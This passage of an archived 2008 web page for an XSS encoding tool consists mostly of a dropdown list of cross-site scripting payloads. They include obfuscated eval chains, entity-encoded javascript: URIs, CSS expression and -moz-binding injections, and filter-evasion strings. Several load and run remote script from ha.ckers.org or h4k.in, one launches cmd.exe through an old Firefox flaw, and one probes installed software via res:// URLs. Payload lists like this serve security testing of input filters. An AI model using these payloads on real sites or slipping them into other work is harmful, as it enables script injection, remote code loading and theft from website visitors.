URL parameter</option><option value="&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;">META w/data:URL</option><option value="&lt;A HREF=&quot;http://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;">Mixed Encoding</option><option value="&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;">Mocha</option><option value=" style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);&quot; a=&quot;">Mozilla -moz-binding-url injection</option><option value=" sstyle=foobar&quot;tstyle=&quot;foobar&quot;ystyle=&quot;foobar&quot;lstyle=&quot;foobar&quot;estyle=&quot;foobar&quot;=-moz-binding:url(http://h4k.in/mozxss.xml#xss)&gt;foobar&lt;/b&gt;#xss)&quot; a=&quot;">Mozilla -moz-binding-url injection - filter evading</option><option value="_
+=
+eval
+b=1
+__
+=
+location
+c=1
+_
+(
+__
+.
+hash
+//
+.
+substr
+(1)
+)">Multiline selfcontained XSS</option><option value="&lt;IMGSRC=&quot;javascript:alert('XSS')&quot;&gt;">Multiline w/Carriage Returns</option><option value="b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name">Name contained XSS variant 1</option><option value="a=/ev/// 
+.source a+=/al/// 
+.source a[a] (name)">Name contained XSS variant 2</option><option value="a=/ev/ 
+.source a+=/al/ 
+.source,a = a[a] a(name)">Name contained XSS variant 3</option><option value="setTimeout// 
+(name// ,0)">Name contained XSS variant 4</option><option value="navigatorurl:test&quot; -chrome &quot;javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)">navigatorurl: code execution</option><option value="&lt;SCRIPT SRC=http://ha.ckers.org/xss.js">No Closing Script Tag</option><option value="&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;">No Quotes/Semicolons</option><option value="&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;">Non-Alpha/Non-Digit</option><option value="&lt;BODY onload!#$%&amp;()*~+-_.###:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;">Non-Alpha/Non-Digit Part 2</option><option value="&lt;/noscript&gt;
+&lt;code onmouseover=a=eval;b=alert;a(b(/h/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;">Noscript-breaker with mouseover</option><option value="perl -e 'print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;'&gt; out">Null Chars 1</option><option value="perl -e 'print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;' &gt; out">Null Chars 2</option><option value="&lt;body onload=;;;;;;;;;;;_=alert;_(1);;;;">Obfuscated body onload vector</option><option value="s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=
+0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=
+0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=pa
+rentNode;x.appendChild(i);">Obfuscated DOM element creation</option><option value="&lt;body &lt;body onload=;;;;;al:eval('al'+'ert(1)');;&gt;">Obfuscated double-body onload vector</option><option value="&lt;IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;&lt;WBR&gt;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;&lt;WBR&gt;#116;&amp;#58;&amp;#97;
+ &amp;#108;&amp;#101;&amp;&lt;WBR&gt;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83&lt;WBR&gt;;&amp;#83;&amp;#39;&amp;#41&gt;">Obfuscated image tag using dec entities</option><option value="&lt;IMGSRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;&lt;WBR&gt;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;&lt;WBR&gt;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28
+ &amp;&lt;WBR&gt;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;">Obfuscated image tag using hex entities</option><option value="&lt;IMGSRC=&amp;#0000106&amp;#0000097&amp;&lt;WBR&gt;#0000118&amp;#0000097&amp;#0000115&amp;&lt;WBR&gt;#0000099&amp;#0000114&amp;#0000105&amp;&lt;WBR&gt;#0000112&amp;#0000116&amp;#0000058
+&amp;&lt;WBR&gt;#0000097&amp;#0000108&amp;#0000101&amp;&lt;WBR&gt;#0000114&amp;#0000116&amp;#0000040&amp;&lt;WBR&gt;#0000039&amp;#0000088&amp;#0000083&amp;&lt;WBR&gt;#0000083&amp;#0000039&amp;#0000041&gt;">Obfuscated image tag using long dec entities</option><option value="&gt;&quot;'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
+ alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;">Obfuscated JS image source</option><option value="(1?(1?{a:1?&quot;&quot;[1?&quot;ev\a\l&quot;:0](1?&quot;\a\lert&quot;:0):0}:0).a:0)[1?&quot;\c\a\l\l&quot;:0](content,1?&quot;x\s\s&quot;:0)">Obfuscated name trigger for Firefox</option><option value="&lt;body/s/onload=x={doc:parent.document};x.doc.writeln(1)">Obfuscated onload attribute variant 1</option><option value="&lt;body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)">Obfuscated onload attribute variant 2</option><option value="123[''+&lt;_&gt;ev&lt;/_&gt;+&lt;_&gt;al&lt;/_&gt;](''+&lt;_&gt;aler&lt;/_&gt;+&lt;_&gt;t&lt;/_&gt;+&lt;_&gt;(1)&lt;/_&gt;);">Obfuscated XML predicate vector variation 1</option><option value="s1=&lt;s&gt;evalalerta(1)a&lt;/s&gt;,s2=&lt;s&gt;&lt;/s&gt;+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:
+0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/
+s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/
+s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:
+0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:
+0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)">Obfuscated XML predicate vector variation 2</option><option value="o={x:''+&lt;s&gt;eva&lt;/s&gt;+&lt;s&gt;l&lt;/s&gt;,y:''+&lt;s&gt;aler&lt;/s&gt;+&lt;s&gt;t&lt;/s&gt;+&lt;s&gt;(1)&lt;/
+s&gt;};function f() { 0[this.x](this.y) }f.call(o);">Obfuscated XML predicate vector variation 3</option><option value="___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)">Obfuscated XSS variant 1</option><option value="&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;">OBJECT</option><option value="&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;">OBJECT w/Embedded XSS</option><option value="a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert('XSS');&quot;)&quot;;eval(a+b+c+d);">OBJECT w/Flash 2</option><option value="&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;">Octal Encoding</option><option value="open(name)">Open string contained in name property</option><option value="&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;'); ?&gt;">PHP</option><option value="alert(1)">Plain JavaScript alert</option><option value="&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;">Protocol Resolution Bypass</option><option value="&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;">Protocol resolution in script tags</option><option value="0%0d%0a%00&lt;script src=//h4k.in&gt;">RegExp based, and native C filter vector.</option><option value="s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)
+'+'';
+u1=s1+s2+s3;URL=u1">Remote IE URL overloading</option><option value="&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;">Remote Stylesheet 1</option><option value="&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;">Remote Stylesheet 2</option><option value="&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;">Remote Stylesheet 3</option><option value="&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;">Remote Stylesheet 4</option><option value="&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;">Removing Cnames</option><option value="&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;">Rename .js to .jpg</option><option value="res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210">res:// installed software probing</option><option value="&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">SCRIPT w/Alert()</option><option value="&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;">SCRIPT w/Char Code</option><option value="&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;">SCRIPT w/Source File</option><option value="a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))">Self-contained XSS variant 1</option><option value="a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))">Self-contained XSS variant 2</option><option value="eval.call(this,unescape.call(this,location))">Self-contained XSS variant 3</option><option value="d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))">Self-contained XSS variant 4</option><option value="l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a">Self-contained XSS variant 5</option><option value="_=eval,__=unescape,___=document.URL,_(__(___))">Self-contained XSS variant 6</option><option value="$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)">Self-contained XSS variant 7</option><option value="$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))">Self-contained XSS variant 8</option><option value="evil=/ev/.source+/al/.source,changeProto=/Strin/.source+/g.prototyp/.source+/e.ss=/.source+/Strin/.source+/g.prototyp/.source+/e.substrin/.source+/g/.source,hshCod=/documen/.source+/t.locatio/.source+/n.has/.source+/h/.source;7[evil](changeProto);hsh=7[evil](hshCod),cod=hsh.ss(1);7[evil](cod)">Self-contained XSS variant 9</option><option value="with(location)with(hash)eval(substring(1))">Self-containing XSS with no dots</option><option value="&lt;IMG SRC=&quot; &amp;#14;  javascript:alert('XSS');&quot;&gt;">Spaces/Meta Chars</option><option value="&lt;!--#exec cmd=&quot;/bin/echo '&lt;SCRIPT SRC'&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo '=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'&quot;--&gt;">SSI</option><option value="&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert('XSS');&lt;/STYLE&gt;">STYLE</option><option value="&lt;style&gt;
+body:after{
+content: “\61\6c\65\72\74\28\31\29″
+}
+&lt;/style&gt;
+&lt;script&gt;
+eval(eval(document.styleSheets[0].cssRules[0].style.content))
+&lt;/script&gt;">Style injection via content and double-eval</option><option value="&lt;XSS STYLE=&quot;xss:expression(alert('XSS'))&quot;&gt;">STYLE w/Anonymous HTML</option><option value="&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&lt;/STYLE&gt;">STYLE w/background</option><option value="&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;">STYLE w/background-image</option><option value="&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;">STYLE w/broken up JavaScript</option><option value="&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&gt;">STYLE w/Comment</option><option value="&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&gt;">Stylesheet</option><option value="}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;">Style-breaker using obfuscated JavaScript</option><option value="&gt;&quot;'">Super basic HTML breaker 2</option><option value="a=alert
+a(0)">Super short XSS variant 1</option><option value="A=alert;A(1)">Super short XSS variant 2</option><option value="&lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TABLE&gt;">TABLE</option><option value="&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;">TD</option><option value="&lt;/textarea&gt;
+&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;">Textarea-breaker with mouseover</option><option value="'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'">Unicode encoded script tags</option><option value="http://aa&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;">URL breaker for double quotes</option><option value="http://aa'&gt;&lt;script&gt;alert(123)&lt;/script&gt;">URL breaker for single quotes</option><option value="&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;">URL encoded image source</option>                    </select>
+
+                    <br />
+					<textarea name="input-text" id="input-text" cols="75" rows="6"></textarea>
+				</fieldset>
+                <fieldset>
+				    <input id="submit" type="submit" value="Convert me!" title="Convert from Selected Input encoding to Output encoding (alt+c)"  accesskey="c" /> &nbsp;&nbsp;<input id="h4kvertor" type="button" onclick="Encoder.Send2HV('input');" value="Send to HackVertor API" title="Send to HackVertor API (alt+s)"  accesskey="s" /> &nbsp;&nbsp;<input id="reset" type="reset" value="Clear All" />
+                </fieldset>
+			</form>
+
+		</div>
+        <div id="footer">&copy; <a href="http://mario.heideri.ch/">.mario</a> 2007, 2008 - <a href="http://validator.w3.org/check?uri=http%3A%2F%2Fh4k.in%2Fencoding%2F">XHTML 1.0 Strict</a><br />Special thanks to <a href="http://yehg.org">d0ubl3_h3lix</a> for further improvements<br/>Last updated: 2008/03/23</div>
+        <div id="selfpromotion">
+            <h3>Other cool stuff:</h3>
+
+            <ul>
+                <li><a href="http://h4k.in/encoding">PHP Charset Encoder</a></li>
+                <li><a href="http://h4k.in/characters">PHP Unicode Generator</a></li>
+                <li><a href="http://phpids.heideri.ch/">PHPIDS Smoketest</a></li>
+                <li><a href="http://h4k.in/dataurl">data: URL testcases</a></li>
+            </ul>
+        </div>
+
+        <script type="text/javascript">document.getElementById('input-text').focus();</script>
+	</body>
+
+<!-- SOME SCRIPT SRC'S ON THIS PAGE HAVE BEEN REWRITTEN BY THE WAYBACK MACHINE
+OF THE INTERNET ARCHIVE IN ORDER TO PRESERVE THE TEMPORAL INTEGRITY OF THE SESSION. -->
+
+
+<!-- SOME LINK HREF'S ON THIS PAGE HAVE BEEN REWRITTEN BY THE WAYBACK MACHINE
+OF THE INTERNET ARCHIVE IN ORDER TO PRESERVE THE TEMPORAL INTEGRITY OF THE SESSION. -->
+
+
+<SCRIPT language="Javascript">
+<!--
+
+// FILE ARCHIVED ON 20080328001343 AND RETRIEVED FROM THE
+// INTERNET ARCHIVE ON 20110205191413.
+// JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+// ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+// SECTION 108(a)(3)).
+
+   var sWayBackCGI = "http://web.archive.org/web/20080328001343/";
+
+   function xResolveUrl(url) {
+      var image = new Image();
+      image.src = url;
+      return image.src;
+   }
+   function xLateUrl(aCollection, sProp) {
+      var i = 0;
+      for(i = 0; i < aCollection.length; i++) {
+         var url = aCollection[i][sProp];         if (typeof(url) == "string") { 
+          if (url.indexOf("mailto:") == -1 &&
+             url.indexOf("javascript:") == -1
+             && url.length > 0) {
+            if(url.indexOf("http") != 0) {
+                url = xResolveUrl(url);
+            }
+            url = url.replace('.wstub.archive.org','');
+            aCollection[i][sProp] = sWayBackCGI + url;
+         }
+         }
+      }
+   }
+
+   xLateUrl(document.getElementsByTagName("IMG"),"src");
+   xLateUrl(document.getElementsByTagName("A"),"href");
+   xLateUrl(document.getElementsByTagName("AREA"),"href");
+   xLateUrl(document.getElementsByTagName("OBJECT"),"codebase");
+   xLateUrl(document.getElementsByTagName("OBJECT"),"data");
+   xLateUrl(document.getElementsByTagName("APPLET"),"codebase");
+   xLateUrl(document.getElementsByTagName("APPLET"),"archive");
+   xLateUrl(document.getElementsByTagName("EMBED"),"src");
+   xLateUrl(document.getElementsByTagName("BODY"),"background");
+   xLateUrl(document.getElementsByTagName("TD"),"background");
+   xLateUrl(document.getElementsByTagName("INPUT"),"src");
+   var forms = document.getElementsByTagName("FORM");
+   if (forms) {
+       var j = 0;
+       for (j = 0; j < forms.length; j++) {
+              f = forms[j];
+              if (typeof(f.action)  == "string") {
+                 if(typeof(f.method)  == "string") {
+                     if(typeof(f.method) != "post") {
+                        f.action = sWayBackCGI + f.action;
+                     }
+                  }
+              }
+        }
+    }
+
+
+//-->
+</SCRIPT>
+
+</html>
